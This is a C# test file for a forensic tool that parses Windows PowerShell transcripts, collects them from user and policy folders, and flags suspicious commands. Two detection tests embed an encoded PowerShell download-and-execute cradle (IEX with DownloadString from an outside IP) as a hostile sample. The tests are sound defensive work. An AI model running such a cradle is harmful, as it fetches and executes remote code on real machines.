using System.Text;
using LogAnalyzer.Dfir.Analysis;
using LogAnalyzer.Dfir.Case;
using LogAnalyzer.Dfir.Integrity;
using LogAnalyzer.Dfir.IO;
using LogAnalyzer.Dfir.Parsing;
using LogAnalyzer.Dfir.Tests.Synthetic;
using LogAnalyzer.Dfir.Model;
using LogAnalyzer.Dfir.Scripting;
using LogAnalyzer.Dfir.Windows.Acquisition;
using LogAnalyzer.Dfir.Windows.Investigation;
using Xunit;

namespace LogAnalyzer.Dfir.Tests;

/// <summary>
/// PowerShell transcripts. The two transcripts below are the exact text of two REAL Windows PowerShell 5.1.26100 transcripts of the lab station WS02 (2026-11-18; only lab names in them):
/// run 1 = policy with the invocation header (Command start time), run 2 = no invocation header. Both are UTF-8 with BOM and CRLF, as written by the host.
/// Everything marked SYNTHETIC (the "PS path>" prompt, truncation, several sessions, hostile text) is made up and was not seen in a real transcript.
/// </summary>
public sealed class PowerShellTranscriptTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "ladfir_pstr_" + Guid.NewGuid().ToString("N"));
    private const string Gtb = "GTB Standard Time";   // UTC+2 in November: the lab station's zone (the transcript shows +02:00)
    private const string Run1Name = "PowerShell_transcript.LAB-WS02.eG5Bzayy.20261118180011.txt";
    private const string Run2Name = "PowerShell_transcript.LAB-WS02.3NClr+vH.20261118180011.txt";

    public PowerShellTranscriptTests() => Directory.CreateDirectory(_dir);

    public void Dispose()
    {
        try
        {
            foreach (var f in Directory.EnumerateFiles(_dir, "*", SearchOption.AllDirectories)) File.SetAttributes(f, FileAttributes.Normal);
            Directory.Delete(_dir, true);
        }
        catch (IOException) { }
    }

    private static string Crlf(string s) => s.ReplaceLineEndings("\r\n");

    // REAL: t1-PowerShell_transcript.LAB-WS02.eG5Bzayy.20261118180011.txt (without the BOM, which Write adds)
    private static readonly string Run1 = Crlf("""
        **********************
        Windows PowerShell transcript start
        Start time: 20261118180011
        Username: LAB-WS02\labadmin
        RunAs User: LAB-WS02\labadmin
        Configuration Name:
        Machine: LAB-WS02 (Microsoft Windows NT 10.0.26100.0)
        Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command Get-Date -Format o; whoami; Get-ChildItem C:\Windows\System32\drivers\etc | Select-Object -First 2 Name; Write-Output 'LA TEST transcript run 1'
        Process ID: 3824
        PSVersion: 5.1.26100.1591
        PSEdition: Desktop
        PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.26100.1591
        BuildVersion: 10.0.26100.1591
        CLRVersion: 4.0.30319.42000
        WSManStackVersion: 3.0
        PSRemotingProtocolVersion: 2.3
        SerializationVersion: 1.1.0.1
        **********************
        **********************
        Command start time: 20261118180011
        **********************
        PS>Get-Date -Format o; whoami; Get-ChildItem C:\Windows\System32\drivers\etc | Select-Object -First 2 Name; Write-Output 'LA TEST transcript run 1'
        2026-11-18T18:00:11.2608129+02:00


        Name
        ----
        hosts
        lmhosts.sam
        LA TEST transcript run 1


        **********************
        Command start time: 20261118180011
        **********************
        PS>$global:?
        True
        **********************
        Windows PowerShell transcript end
        End time: 20261118180011
        **********************

        """);

    // REAL: t2-PowerShell_transcript.LAB-WS02.3NClr+vH.20261118180011.txt (no OutputDirectory, no invocation header)
    private static readonly string Run2 = Crlf("""
        **********************
        Windows PowerShell transcript start
        Start time: 20261118180011
        Username: LAB-WS02\labadmin
        RunAs User: LAB-WS02\labadmin
        Configuration Name:
        Machine: LAB-WS02 (Microsoft Windows NT 10.0.26100.0)
        Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command hostname; Write-Output 'LA TEST transcript run 2'
        Process ID: 7452
        PSVersion: 5.1.26100.1591
        PSEdition: Desktop
        PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.26100.1591
        BuildVersion: 10.0.26100.1591
        CLRVersion: 4.0.30319.42000
        WSManStackVersion: 3.0
        PSRemotingProtocolVersion: 2.3
        SerializationVersion: 1.1.0.1
        **********************
        PS>hostname; Write-Output 'LA TEST transcript run 2'

        LA TEST transcript run 2
        PS>$global:?
        True
        **********************
        Windows PowerShell transcript end
        End time: 20261118180011
        **********************

        """);

    private const string Cmd1 = "Get-Date -Format o; whoami; Get-ChildItem C:\\Windows\\System32\\drivers\\etc | Select-Object -First 2 Name; Write-Output 'LA TEST transcript run 1'";
    private const string Cmd2 = "hostname; Write-Output 'LA TEST transcript run 2'";

    private string Write(string name, string text, bool bom = true)
    {
        var d = Path.Combine(_dir, Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(d);
        var p = Path.Combine(d, name);
        File.WriteAllBytes(p, new UTF8Encoding(bom).GetBytes(text));
        return p;
    }

    private static (ParseResult R, List<TimelineEvent> E) Run(string path, string tz = "")
    {
        var sink = new ListSink();
        var item = new EvidenceItem { EvidenceId = "EV-PS", CaseId = "C", Source = "test", SourceType = PowerShellTranscriptParser.SourceTypeName, StoredPath = path, Timezone = tz };
        var r = new PowerShellTranscriptParser().Parse(item, path, sink, default);
        return (r, sink.Events);
    }

    // ---- the real transcripts ----

    [Fact]
    public void Real_run_1_with_invocation_header_gives_one_session_and_one_command_and_skips_the_generated_prompt_line()
    {
        var (r, e) = Run(Write(Run1Name, Run1), Gtb);
        Assert.Equal(2, r.Records);
        Assert.Empty(r.Gaps);
        Assert.Equal(0, r.MalformedRecords);
        var session = Assert.Single(e, x => x.EventId == "Session");
        var cmd = Assert.Single(e, x => x.EventId == "Command");
        Assert.All(e, x => { Assert.Equal("PowerShellTranscript", x.Source); Assert.Equal(Classification.Direct, x.Classification); });

        Assert.Equal(@"LAB-WS02\labadmin", session.Fields["Username"]);
        Assert.Equal(@"LAB-WS02\labadmin", session.Fields["RunAs User"]);
        Assert.Equal("", session.Fields["Configuration Name"]);
        Assert.Equal("LAB-WS02", session.Fields["Machine"]);
        Assert.Equal("3824", session.Fields["Process ID"]);
        Assert.Equal("5.1.26100.1591", session.Fields["PSVersion"]);
        Assert.Equal("Desktop", session.Fields["PSEdition"]);
        Assert.Contains("-NoProfile -Command Get-Date -Format o", session.Fields["Host Application"]);
        Assert.Equal("20261118180011", session.Fields["Session Start Raw"]);
        Assert.Equal("20261118180011", session.Fields["Session End Raw"]);
        Assert.Equal("da", session.Fields["Session Ended"]);
        Assert.Equal("1", session.Fields["Command Count"]);
        Assert.Equal("1", session.Fields["Generated Prompt Lines Skipped"]);
        Assert.Equal(@"LAB-WS02\labadmin", session.User);
        Assert.Equal("LAB-WS02", session.Host);
        Assert.Equal(3824, session.Pid);
        Assert.Equal("powershell.exe", session.Process);

        // the command exactly as typed; the generated "PS>$global:?" is not a command
        Assert.Equal(Cmd1, cmd.Fields["Command"]);
        Assert.DoesNotContain(e, x => x.Fields.TryGetValue("Command", out var c) && c.Contains("$global:?"));
        Assert.Equal("6", cmd.Fields["Output Line Count"]);   // non-blank output lines: the date, Name, ----, hosts, lmhosts.sam, the Write-Output line
        Assert.Equal("20261118180011", cmd.Fields["Command Start Raw"]);
        Assert.Equal(Confidence.High, cmd.Confidence);
        Assert.Contains("Command start time", cmd.TimeSemantics);
        Assert.Equal(@"LAB-WS02\labadmin", cmd.User);
        Assert.Equal($"{Run1Name}:line=22", cmd.Locator);
    }

    [Fact]
    public void Real_run_2_without_invocation_header_gives_one_command_with_the_session_time_and_medium_confidence()
    {
        var (r, e) = Run(Write(Run2Name, Run2), Gtb);
        Assert.Equal(2, r.Records);
        Assert.Empty(r.Gaps);
        var cmd = Assert.Single(e, x => x.EventId == "Command");
        Assert.Equal(Cmd2, cmd.Fields["Command"]);
        Assert.Equal("1", cmd.Fields["Output Line Count"]);   // the blank line is not counted
        Assert.Equal("ora de început a sesiunii; comanda nu are oră proprie", cmd.TimeSemantics);
        Assert.Equal(Confidence.Medium, cmd.Confidence);
        Assert.Equal("", cmd.Fields["Command Start Raw"]);
        var session = Assert.Single(e, x => x.EventId == "Session");
        Assert.Equal(session.Time.Utc, cmd.Time.Utc);
        Assert.Equal("7452", session.Fields["Process ID"]);
        Assert.Equal("1", session.Fields["Generated Prompt Lines Skipped"]);
    }

    [Fact]
    public void The_local_time_is_converted_with_the_stations_zone_and_kept_raw_and_unconverted_without_it()
    {
        var (_, withZone) = Run(Write(Run1Name, Run1), Gtb);
        Assert.Equal(2, withZone.Count);
        foreach (var x in withZone)
        {
            Assert.Equal(new DateTimeOffset(2026, 11, 18, 16, 0, 11, TimeSpan.Zero), x.Time.Utc);   // 18:00:11 local, UTC+2
            Assert.Equal("20261118180011", x.Time.Raw);
            Assert.Equal(Gtb, x.Fields["Time Zone Used"]);
        }
        Assert.Equal("2026-11-18 18:00:11", withZone.Single(x => x.EventId == "Session").Fields["Session Start Local"]);
        Assert.Equal("2026-11-18 18:00:11", withZone.Single(x => x.EventId == "Command").Fields["Local Time"]);

        var (_, noZone) = Run(Write(Run1Name, Run1));
        Assert.Equal(2, noZone.Count);
        foreach (var x in noZone)
        {
            Assert.Null(x.Time.Utc);                                   // never UTC by assumption
            Assert.Equal("20261118180011", x.Time.Raw);
            Assert.Contains("neconvertită", x.TimeZoneBasis);
            Assert.Contains("fusul stației nu se cunoaște", x.TimeUncertainty);
            Assert.Equal("necunoscut", x.Fields["Time Zone Used"]);
            Assert.Contains("fără fus orar", x.TimeSemantics);
        }
        Assert.Equal("2026-11-18 18:00:11", noZone.Single(x => x.EventId == "Command").Fields["Local Time"]);
    }

    [Fact]
    public void The_output_of_the_commands_is_never_stored()
    {
        var (_, e) = Run(Write(Run1Name, Run1), Gtb);
        foreach (var x in e)
        {
            var all = string.Join(" | ", new[] { x.Summary, x.Locator, x.Notes, x.TimeSemantics }.Concat(x.Fields.Values));
            Assert.DoesNotContain("lmhosts.sam", all);
            Assert.DoesNotContain("2026-11-18T18:00:11.2608129", all);
            Assert.DoesNotContain(" ---- ", " " + all.Replace(" | ", "  ") + " ");   // the separator line of the table output
        }
        Assert.StartsWith("nu", e.Single(x => x.EventId == "Command").Fields["Output Stored"]);
    }

    [Fact]
    public void The_descriptor_limits_are_in_romanian_and_say_that_output_is_not_kept_and_the_prompt_variant_was_not_seen()
    {
        var d = new PowerShellTranscriptParser().Descriptor;
        Assert.Contains(d.Limitations, l => l.Contains("Ieșirea comenzilor NU este păstrată"));
        Assert.Contains(d.Limitations, l => l.Contains("PS cale>") && l.Contains("nu a fost văzut"));
        Assert.Contains(d.Limitations, l => l.Contains("fără fus orar"));
        Assert.Contains("ps_transcript", d.SourceTypes);
        Assert.NotNull(d.Capabilities);
    }

    // ---- fingerprint ----

    [Fact]
    public void The_fingerprint_needs_the_name_and_the_header_and_tolerates_the_bom()
    {
        Assert.Equal("ps_transcript", EvidenceFingerprint.Detect(Write(Run1Name, Run1)));
        Assert.Equal("ps_transcript", EvidenceFingerprint.Detect(Write(Run2Name, Run2, bom: false)));
        Assert.Equal("ps_transcript", InvestigationPipeline.ImportType(Write(Run2Name, Run2)));
        // right name, other content; right content, other name
        Assert.NotEqual("ps_transcript", EvidenceFingerprint.Detect(Write(Run1Name, "doar text\r\nfără antet\r\n")));
        Assert.NotEqual("ps_transcript", EvidenceFingerprint.Detect(Write("notes.txt", Run1)));
        Assert.Equal("file", InvestigationPipeline.ImportType(Write("notes.txt", Run1)));
        // a copy suffix the case workspace adds keeps the format
        Assert.Equal("ps_transcript", EvidenceFingerprint.Detect(Write("PowerShell_transcript.LAB-WS02.eG5Bzayy.20261118180011_1.txt", Run1)));
    }

    // ---- several sessions, truncation, hostile and not-seen forms ----

    [Fact]
    public void Several_sessions_in_one_file_give_one_session_event_each()
    {
        var (r, e) = Run(Write(Run1Name, Run1 + Run2), Gtb);
        Assert.Equal(4, r.Records);
        Assert.Equal(2, e.Count(x => x.EventId == "Session"));
        Assert.Equal([Cmd1, Cmd2], e.Where(x => x.EventId == "Command").Select(x => x.Fields["Command"]).ToArray());
        Assert.Equal(["3824", "7452"], e.Where(x => x.EventId == "Session").Select(x => x.Fields["Process ID"]).ToArray());
        Assert.Empty(r.Gaps);
    }

    [Fact]
    public void A_truncated_file_gives_a_gap_and_keeps_what_was_read_without_throwing()
    {
        var cut = Run1[..Run1.IndexOf("hosts\r\n", StringComparison.Ordinal)];   // SYNTHETIC: the real run 1 cut in the middle of the output
        var (r, e) = Run(Write(Run1Name, cut), Gtb);
        Assert.True(string.IsNullOrEmpty(r.Error));
        Assert.Contains(r.Gaps, g => g.Reason.Contains("nu are linia de sfârșit"));
        var cmd = Assert.Single(e, x => x.EventId == "Command");
        Assert.Equal(Cmd1, cmd.Fields["Command"]);
        Assert.Equal("nu (fără linia de sfârșit)", e.Single(x => x.EventId == "Session").Fields["Session Ended"]);
    }

    [Fact]
    public void A_header_that_never_closes_and_a_file_without_a_header_are_gaps_not_exceptions()
    {
        var (r1, e1) = Run(Write(Run1Name, "**********************\r\nWindows PowerShell transcript start\r\nStart time: 20261118180011\r\nUsername: LAB-WS02\\labadmin\r\n"), Gtb);
        Assert.True(string.IsNullOrEmpty(r1.Error));
        Assert.Contains(r1.Gaps, g => g.Reason.Contains("antetul sesiunii"));
        Assert.Equal(@"LAB-WS02\labadmin", Assert.Single(e1).Fields["Username"]);

        var (r2, e2) = Run(Write(Run1Name, "nu este o transcriere\r\nPS>Get-Date\r\n"), Gtb);
        Assert.True(string.IsNullOrEmpty(r2.Error));
        Assert.Empty(e2);
        Assert.NotEmpty(r2.Gaps);
        Assert.True(r2.MalformedRecords > 0);

        var (r3, e3) = Run(Write(Run1Name, ""), Gtb);
        Assert.True(string.IsNullOrEmpty(r3.Error));
        Assert.Empty(e3);
        Assert.NotEmpty(r3.Gaps);
    }

    [Fact]
    public void SYNTHETIC_interactive_prompt_with_a_path_is_recognised_with_lower_confidence_and_a_note()
    {
        // SYNTHETIC: "PS <path>> command" was NOT seen in a real transcript
        var text = Crlf("""
            **********************
            Windows PowerShell transcript start
            Start time: 20261118190000
            Username: LAB-WS02\labadmin
            Machine: LAB-WS02 (Microsoft Windows NT 10.0.26100.0)
            Process ID: 100
            **********************
            **********************
            Command start time: 20261118190005
            **********************
            PS C:\Users\labadmin> Get-Process
            Id Name
            1 System
            PS C:\Users\labadmin> whoami
            labadmin
            **********************
            Windows PowerShell transcript end
            End time: 20261118190100
            **********************

            """);
        var (r, e) = Run(Write("PowerShell_transcript.LAB-WS02.abcd1234.20261118190000.txt", text), Gtb);
        var cmds = e.Where(x => x.EventId == "Command").ToList();
        Assert.Equal(["Get-Process", "whoami"], cmds.Select(x => x.Fields["Command"]).ToArray());
        Assert.All(cmds, c => { Assert.Contains("nevăzut", c.Fields["Prompt Style"]); Assert.Contains("nevăzut", c.Fields["Note"]); });
        Assert.Equal(Confidence.Medium, cmds[0].Confidence);   // with its own start time: High lowered one level
        Assert.Equal(Confidence.Low, cmds[1].Confidence);      // with the session time: Medium lowered one level
        Assert.Equal("2", cmds[0].Fields["Output Line Count"]);
        Assert.Equal(new DateTimeOffset(2026, 11, 18, 17, 0, 5, TimeSpan.Zero), cmds[0].Time.Utc);
        Assert.Equal(3, r.Records);
    }

    [Fact]
    public void SYNTHETIC_hidden_characters_in_a_command_do_not_reach_the_event_and_asterisks_in_output_are_output()
    {
        var text = Crlf("**********************\nWindows PowerShell transcript start\nStart time: 20261118190000\nUsername: LAB-WS02\\labadmin\n**********************\nPS>Write-Output 'a\u202Eb'\n**********************\nsunt asteriscuri in iesire\n**********************\nPS>whoami\n**********************\nWindows PowerShell transcript end\nEnd time: 20261118190100\n**********************\n");
        var (_, e) = Run(Write("PowerShell_transcript.LAB-WS02.abcd1234.20261118190000.txt", text), Gtb);
        var cmds = e.Where(x => x.EventId == "Command").ToList();
        Assert.Equal(2, cmds.Count);
        Assert.DoesNotContain('\u202E', cmds[0].Fields["Command"]);
        Assert.Equal("2", e.Single(x => x.EventId == "Session").Fields["Command Count"]);
    }

    // ---- the rule ----

    private static string B64(string s) => Convert.ToBase64String(Encoding.Unicode.GetBytes(s));

    [Fact]
    public void A_suspicious_command_in_a_transcript_gives_one_direct_finding_that_cites_the_file_and_the_command_time_and_a_normal_one_none()
    {
        var bad = "powershell.exe -nop -w hidden -e " + B64("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')");
        var text = Crlf($"**********************\nWindows PowerShell transcript start\nStart time: 20261118190000\nUsername: LAB-WS02\\labadmin\nMachine: LAB-WS02 (Microsoft Windows NT 10.0.26100.0)\nProcess ID: 9\n**********************\n**********************\nCommand start time: 20261118190007\n**********************\nPS>{bad}\nsecret output line\n**********************\nCommand start time: 20261118190010\n**********************\nPS>Get-Date\n**********************\nWindows PowerShell transcript end\nEnd time: 20261118190100\n**********************\n");
        var path = Write("PowerShell_transcript.LAB-WS02.abcd1234.20261118190000.txt", text);
        var (_, e) = Run(path, Gtb);
        var findings = Correlation.Run(e).Where(x => x.RuleId == "PS-TRANSCRIPT-SUSPICIOUS").ToList();
        var f = Assert.Single(findings);
        Assert.Equal(Classification.Direct, f.Classification);
        Assert.Equal(new DateTimeOffset(2026, 11, 18, 17, 0, 7, TimeSpan.Zero), f.FirstSeenUtc);
        Assert.Contains("PowerShell_transcript.LAB-WS02.abcd1234.20261118190000.txt", f.Description);
        Assert.Contains("ora locală 2026-11-18 19:00:07", f.Description);
        Assert.Contains("DownloadString", f.Description);          // decoded text
        Assert.DoesNotContain("secret output line", f.Description + f.PlainWhat);
        Assert.Single(f.SupportingEvidence);
        Assert.Contains("rândul", f.SupportingEvidence[0].Description);
        Assert.DoesNotContain(Correlation.Run(e), x => x.RuleId == "PS-CMDLINE-SUSPICIOUS");

        var (_, benign) = Run(Write(Run1Name, Run1), Gtb);
        Assert.DoesNotContain(Correlation.Run(benign), x => x.RuleId.StartsWith("PS-", StringComparison.Ordinal));
        Assert.Contains(RuleContracts.All, c => c.RuleId == "PS-TRANSCRIPT-SUSPICIOUS");
    }

    // ---- collection ----

    private readonly record struct Station(string Vol, string Profile, CaseWorkspace Case);

    private Station NewStation()
    {
        var vol = Path.Combine(_dir, "vol");
        var profile = Path.Combine(vol, "Users", "test");
        Directory.CreateDirectory(profile);
        var ws = InvestigationPipeline.NewCase(Path.Combine(_dir, "cases"), "pstr-colectare", TestScopes.Valid());
        return new(vol, profile, ws);
    }

    private static CollectorOutcome Collect(Station st, params string[] policyDirs) =>
        new UserArtifactsCollector(() => [new UserProfileEntry("S-1-5-21-1111111111-2222222222-3333333333-1001", st.Profile)], () => [st.Vol + Path.DirectorySeparatorChar],
            (s, d, l, lab, ct) => throw new InvalidOperationException("no shadow copy in this test"), () => new HashSet<string>(), null, () => [], transcriptPolicyDirs: () => policyDirs)
        .Collect(new CollectorContext { Case = st.Case, IsElevated = true }, default);

    private static void Put(string dir, string name, string text)
    {
        Directory.CreateDirectory(dir);
        File.WriteAllBytes(Path.Combine(dir, name), new UTF8Encoding(true).GetBytes(text));
    }

    [Fact]
    public void The_collector_finds_transcripts_in_documents_root_in_yyyyMMdd_subfolders_and_in_the_policy_directory_and_only_those()
    {
        var st = NewStation();
        var docs = Path.Combine(st.Profile, "Documents");
        Put(docs, Run2Name, Run2);                                          // Documents root
        Put(Path.Combine(docs, "20261118"), Run1Name, Run1);                // yyyyMMdd sub-folder, depth 1
        Put(Path.Combine(docs, "20261118"), "notes.txt", "x");              // not a transcript name
        Put(Path.Combine(docs, "altfolder"), "PowerShell_transcript.LAB-WS02.zzzz.20261118180011.txt", Run1);   // not a date folder: not read
        Put(Path.Combine(docs, "20261118", "deeper"), "PowerShell_transcript.LAB-WS02.deep.20261118180011.txt", Run1);   // depth 2: not read
        var policy = Path.Combine(st.Vol, "LA", "pstr");
        Put(Path.Combine(policy, "20261117"), "PowerShell_transcript.LAB-WS02.pol1.20261117090000.txt", Run1);   // policy directory: recursive
        Put(Path.Combine(policy, "20261117", "x", "y"), "PowerShell_transcript.LAB-WS02.pol2.20261117100000.txt", Run1);

        var o = Collect(st, policy);

        var got = o.Evidence.Where(e => e.SourceType == PowerShellTranscriptParser.SourceTypeName).ToList();
        Assert.Equal(4, got.Count);
        var names = got.Select(e => Path.GetFileName(e.StoredPath)).OrderBy(x => x, StringComparer.Ordinal).ToList();
        Assert.Equal(["PowerShell_transcript.LAB-WS02.3NClr+vH.20261118180011.txt", "PowerShell_transcript.LAB-WS02.eG5Bzayy.20261118180011.txt",
                      "PowerShell_transcript.LAB-WS02.pol1.20261117090000.txt", "PowerShell_transcript.LAB-WS02.pol2.20261117100000.txt"], names);
        Assert.All(got, e => Assert.Equal(Hashing.Sha256File(st.Case.FullPath(e.StoredPath)), e.Sha256));
        Assert.DoesNotContain(o.Errors, m => m.Contains("Transcrieri"));
    }

    [Fact]
    public void The_policy_directory_is_expanded_a_network_directory_is_a_gap_and_a_file_over_the_cap_is_not_taken()
    {
        var st = NewStation();
        var policy = Path.Combine(st.Vol, "LA", "pstr2");
        Environment.SetEnvironmentVariable("LA_TEST_PSTR_ROOT", st.Vol);
        try
        {
            Put(policy, Run1Name, Run1);
            Directory.CreateDirectory(Path.Combine(st.Profile, "Documents"));
            var big = Path.Combine(st.Profile, "Documents", "PowerShell_transcript.LAB-WS02.big0.20261118180011.txt");
            using (var fs = File.Create(big)) fs.SetLength(PowerShellTranscriptParser.MaxFileBytes + 1);

            var o = Collect(st, @"%LA_TEST_PSTR_ROOT%\LA\pstr2", @"\\SRV-LAB\transcrieri$");

            var got = o.Evidence.Where(e => e.SourceType == PowerShellTranscriptParser.SourceTypeName).ToList();
            Assert.Equal(Run1Name, Path.GetFileName(Assert.Single(got).StoredPath));   // the expanded directory was read; the big file and the UNC directory were not
            Assert.Contains(o.Errors, m => m.Contains("director de transcriere în rețea, necolectat"));
            Assert.Contains(o.Errors, m => m.Contains("peste limita de") && m.Contains("big0"));
        }
        finally { Environment.SetEnvironmentVariable("LA_TEST_PSTR_ROOT", null); }
    }

    private static string TrName(string tag) => $"PowerShell_transcript.LAB-WS02.{tag}.20261118180011.txt";

    [Fact]
    public void A_policy_directory_that_is_also_a_documents_folder_or_given_twice_is_read_once()
    {
        var st = NewStation();
        var docs = Path.Combine(st.Profile, "Documents");
        Put(docs, Run2Name, Run2);
        Put(Path.Combine(docs, "20261118"), Run1Name, Run1);
        // the policy points at Documents itself (upper case, trailing separator), a second policy value at the date folder inside it, a third at a folder walked below the first
        Put(Path.Combine(docs, "pol", "sub"), TrName("pold"), Run1);
        var o = Collect(st, (docs + Path.DirectorySeparatorChar).ToUpperInvariant(), Path.Combine(docs, "20261118"), docs, Path.Combine(docs, "pol"));
        var names = o.Evidence.Where(e => e.SourceType == PowerShellTranscriptParser.SourceTypeName).Select(e => Path.GetFileName(e.StoredPath)).OrderBy(x => x, StringComparer.Ordinal).ToList();
        Assert.Equal(names.Distinct().Count(), names.Count);
        Assert.Equal(3, names.Count);   // Run1, Run2 and the one below pol, each once
    }

    [Fact]
    public void A_policy_directory_reached_through_a_link_is_refused_and_reported()
    {
        var st = NewStation();
        var real = Path.Combine(st.Vol, "LA", "real");
        Put(Path.Combine(real, "sub"), TrName("lnk1"), Run1);
        var link = Path.Combine(st.Vol, "LA", "viaLink");
        var mk = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", $"/c mklink /J \"{link}\" \"{real}\"") { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true })!;
        mk.StandardOutput.ReadToEnd(); mk.StandardError.ReadToEnd(); mk.WaitForExit(10000);
        Assert.True(mk.ExitCode == 0, "a junction could not be created; this test needs one");
        try
        {
            var o = Collect(st, Path.Combine(link, "sub"));
            Assert.DoesNotContain(o.Evidence, e => e.SourceType == PowerShellTranscriptParser.SourceTypeName);
            Assert.Contains(o.Errors, m => m.Contains("legătură") && m.Contains("nu au fost colectate"));
        }
        finally { Directory.Delete(link); }
    }

    [Fact]
    public void Every_collection_limit_that_is_hit_is_reported_with_the_limit_and_the_folder()
    {
        var st = NewStation();
        // depth: a policy tree 10 levels deep; the transcript at level 8 is taken, the one at level 9 is not, and the depth limit is named
        var deep = Path.Combine(st.Vol, "LA", "deep");
        var d8 = deep; for (int i = 0; i < 8; i++) d8 = Path.Combine(d8, "n" + i);
        Put(d8, TrName("lvl8"), Run1);
        Put(Path.Combine(d8, "n8"), TrName("lvl9"), Run1);
        // date folders: 401 yyyyMMdd folders in Documents
        var docs = Path.Combine(st.Profile, "Documents");
        for (int i = 0; i < UserArtifactsCollector.MaxTranscriptDateFolders + 1; i++) Directory.CreateDirectory(Path.Combine(docs, (20200101 + i).ToString()));
        // folders: more than the folder limit in one policy tree
        var wide = Path.Combine(st.Vol, "LA", "wide");
        for (int i = 0; i < UserArtifactsCollector.MaxTranscriptPolicyFolders + 5; i++) Directory.CreateDirectory(Path.Combine(wide, "f" + i));
        // files per folder
        var many = Path.Combine(st.Vol, "LA", "many");
        Directory.CreateDirectory(many);
        for (int i = 0; i < UserArtifactsCollector.MaxTranscriptEntriesPerFolder + 1; i++) File.WriteAllBytes(Path.Combine(many, TrName("m" + i.ToString("D5"))), []);

        var o = Collect(st, deep, wide, many);

        var names = o.Evidence.Where(e => e.SourceType == PowerShellTranscriptParser.SourceTypeName).Select(e => Path.GetFileName(e.StoredPath)).ToList();
        Assert.Contains(TrName("lvl8"), names);
        Assert.DoesNotContain(TrName("lvl9"), names);
        Assert.Contains(o.Errors, m => m.Contains("limita de adâncime") && m.Contains("deep"));
        Assert.Contains(o.Errors, m => m.Contains("limita de subfoldere de dată") && m.Contains("Documents"));
        Assert.Contains(o.Errors, m => m.Contains("limita de foldere parcurse") && m.Contains("wide"));
        Assert.Contains(o.Errors, m => m.Contains("limita de fișiere pe folder") && m.Contains("many"));
    }

    [Fact]
    public void The_live_transcript_collector_itself_starts_no_powershell()
    {
        // review round 2: this covers the collector only. The application DOES run powershell.exe elsewhere (PowerShellAuditCollector, AuditCollector.ps1);
        // a transcript of that session is labelled by PS-TRANSCRIPT-SUSPICIOUS, not excluded (see the test below).
        var src = File.ReadAllText(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "LogAnalyzer.Dfir.Windows", "Acquisition", "UserArtifactsCollector.cs"));
        Assert.DoesNotContain("powershell.exe", src, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("System.Management.Automation", src, StringComparison.Ordinal);
    }

    [Fact]
    public void A_transcribed_session_of_the_applications_own_audit_script_is_labelled_not_hidden_or_lowered()
    {
        var bad = "powershell.exe -nop -w hidden -e " + B64("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')");
        List<Finding> RunWith(string hostApp)
        {
            var ev = new TimelineEvent
            {
                Time = Timestamp.FromUtc(new DateTime(2026, 11, 18, 17, 0, 7, DateTimeKind.Utc), "", "t"), Source = "PowerShellTranscript", EventId = "Command", EvidenceId = "E",
                Summary = "s", Locator = "l", Fields = { ["Command"] = bad, ["Host Application"] = hostApp, ["Source File"] = "PowerShell_transcript.LAB-WS02.x.txt", ["Line"] = "20" },
            };
            return Correlation.Run([ev]).Where(x => x.RuleId == "PS-TRANSCRIPT-SUSPICIOUS").ToList();
        }
        var own = Assert.Single(RunWith(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Program Files\LogAnalyzer\Scripts\AuditCollector.ps1 -TargetType PC"));
        var other = Assert.Single(RunWith(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile"));
        Assert.Contains(own.AlternativeExplanations, a => a.Contains("AuditCollector.ps1") && a.Contains("imitat"));
        Assert.DoesNotContain(other.AlternativeExplanations, a => a.Contains("AuditCollector.ps1"));
        Assert.Equal(other.Severity, own.Severity);               // the name can be imitated: never lowered
        Assert.Equal(other.Classification, own.Classification);
    }

    [Fact]
    public void Collected_transcripts_are_parsed_by_the_production_registry_with_the_case_zone_empty_so_times_stay_unconverted()
    {
        var st = NewStation();
        Put(Path.Combine(st.Profile, "Documents"), Run2Name, Run2);
        var o = Collect(st);
        var item = Assert.Single(o.Evidence, e => e.SourceType == PowerShellTranscriptParser.SourceTypeName);
        Assert.Contains(LogAnalyzer.Dfir.Windows.Parsers.WindowsParsers.Registry.Candidates(item), p => p is PowerShellTranscriptParser);
        Assert.Contains("ora locală", item.Notes);
    }

    // ---- remote package ----

    [Fact]
    public void The_remote_package_knows_the_optional_artifact_and_types_only_a_real_transcript_in_its_folder()
    {
        Assert.Contains("ps-transcripts", RemoteCollection.OptionalArtifacts);
        Assert.Contains("ps-transcripts", RemoteCollection.PersonalHistoryArtifacts);
        Assert.DoesNotContain("ps-transcripts", RemoteCollection.KnownArtifacts);
        var good = Write(Run1Name, Run1);
        var other = Write(Run1Name, "text oarecare\r\n");
        Assert.Equal("ps_transcript", RemoteCollection.ImportKind("files/PowerShellTranscripts/User_test/" + Run1Name, good));
        Assert.Equal("ps_transcript", RemoteCollection.ImportKind("files/PowerShellTranscripts/Policy/" + Run1Name, good));
        Assert.Equal("file", RemoteCollection.ImportKind("files/PowerShellTranscripts/User_test/" + Run1Name, other));
        Assert.Equal("file", RemoteCollection.ImportKind("files/PowerShellTranscripts/User_test/notes.txt", good));
        Assert.Equal("file", RemoteCollection.ImportKind("files/PowerShellTranscripts/" + Run1Name, good));
        Assert.Null(RemoteCollection.UnauthorizedFile("files/PowerShellTranscripts/Policy/" + Run1Name, ["ps-transcripts"]));
        Assert.NotNull(RemoteCollection.UnauthorizedFile("files/PowerShellTranscripts/Policy/" + Run1Name, ["remote-tool-logs"]));
    }
}
